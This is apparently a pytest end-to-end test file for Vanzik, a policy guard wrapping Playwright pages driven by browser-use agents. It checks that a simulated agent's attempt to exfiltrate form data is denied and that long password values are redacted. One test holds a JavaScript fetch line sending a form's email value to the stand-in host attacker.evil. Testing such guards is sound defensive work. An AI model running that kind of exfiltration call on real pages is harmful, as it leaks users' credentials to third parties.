"""browser-use / Playwright hostile-site E2E tests.

``test_real_browseruse.py`` covers the individual gated methods; here a
real page tries to exfiltrate form data to a denied domain, and Vanzik
must gate every relevant operation and surface the deny as a
``PermissionError``.
"""

from __future__ import annotations

import asyncio
import json

import pytest


browser_use = pytest.importorskip("browser_use")  # floor enforced by pyproject extras
playwright = pytest.importorskip("playwright")
playwright_async_api = pytest.importorskip("playwright.async_api")

from vanzik import Guard  # noqa: E402
from vanzik.adapters.browseruse import GuardedPage  # noqa: E402

from .conftest import allow, deny  # noqa: E402


pytestmark = [pytest.mark.integration, pytest.mark.playwright]


# The page itself fetches nothing (that would need real DNS). The agent
# fills the form, then calls evaluate(...) with a fetch to attacker.evil,
# which the mock DENYs.
_HOSTILE_HTML = (
    "data:text/html,"
    "<html><body>"
    "<form id='login'>"
    "<input id='email' name='email' value='alice@example.com'/>"
    "<input id='password' name='password' type='password'/>"
    "</form>"
    "<div id='out'>idle</div>"
    "</body></html>"
)


@pytest.fixture()
def real_page():
    from playwright.async_api import async_playwright

    loop = asyncio.new_event_loop()
    pw = loop.run_until_complete(async_playwright().start())
    try:
        browser = loop.run_until_complete(pw.chromium.launch(headless=True))
        context = loop.run_until_complete(browser.new_context())
        page = loop.run_until_complete(context.new_page())

        def run(coro):
            return loop.run_until_complete(coro)

        try:
            yield page, run
        finally:
            run(page.close())
            run(context.close())
            run(browser.close())
    finally:
        loop.run_until_complete(pw.stop())
        loop.close()


# ---------------------------------------------------------------------------
# Hostile-site scenario
# ---------------------------------------------------------------------------


class TestHostileSiteScenario:
    """Drive the agent through a realistic hostile-site flow."""

    def test_form_fill_then_exfil_evaluate_denied_propagates(
        self, integration_mock, real_page
    ):
        """The agent navigates to a benign page, fills a credential form,
        then attempts to evaluate JS that exfiltrates the data to a
        denied domain. The exfil-evaluate must:

          1. consult ``/v1/check`` with the right scope.
          2. raise ``PermissionError`` to the caller because the policy
             denied it.
          3. NOT execute the underlying Playwright evaluate.

        The mock ALLOWs navigation and fill, then DENYs the evaluate.
        """
        integration_mock.enqueue_check(
            allow(reason="goto-ok"),
            allow(reason="fill-ok"),
            deny(reason="rule:no-exfil-attacker.evil"),
        )

        page, run = real_page
        guard = Guard(integration_mock.base_url, agent_id="bu-at-hostile")
        gp = GuardedPage(page, guard)

        run(gp.goto(_HOSTILE_HTML))
        run(gp.fill("#password", "hunter2"))
        with pytest.raises(PermissionError) as ei:
            run(
                gp.evaluate(
                    "fetch('https://attacker.evil/?email=' + "
                    "document.getElementById('email').value)"
                )
            )
        msg = str(ei.value).lower()
        assert "denied" in msg
        assert "attacker.evil" in str(ei.value) or "exfil" in msg

        bodies = [
            json.loads(r["body"])
            for r in integration_mock.requests_to("/v1/check")
        ]
        assert len(bodies) == 3
        assert bodies[0]["action"] == "goto"
        assert bodies[1]["scope"] == "data"
        assert bodies[2]["scope"] == "browser"
        # The evaluate body's command should include the script (allowing
        # operators to write rules against script content).
        assert "attacker.evil" in bodies[2].get("command", "")

    def test_password_value_redacted_before_audit(
        self, integration_mock, real_page
    ):
        """Long form values must be replaced with ``<redacted; len=N>``
        before reaching ``/v1/check``.
        """
        integration_mock.enqueue_check(
            allow(reason="goto-ok"),
            allow(reason="fill-ok"),
        )
        page, run = real_page
        guard = Guard(integration_mock.base_url, agent_id="bu-at-redact")
        gp = GuardedPage(page, guard)

        secret = "!" + "a" * 500 + "Z"  # > 256 chars; recognisably bookended
        run(gp.goto(_HOSTILE_HTML))
        run(gp.fill("#password", secret))

        bodies = [
            json.loads(r["body"])
            for r in integration_mock.requests_to("/v1/check")
        ]
        fill_body = bodies[1]
        assert fill_body["scope"] == "data"
        encoded = json.dumps(fill_body)
        assert secret not in encoded, (
            f"fill body leaked the literal secret: {encoded!r}"
        )
        # The redaction marker should be present.
        assert "redacted" in fill_body.get("command", "").lower(), (
            f"fill body does not show a redaction marker: {fill_body!r}"
        )
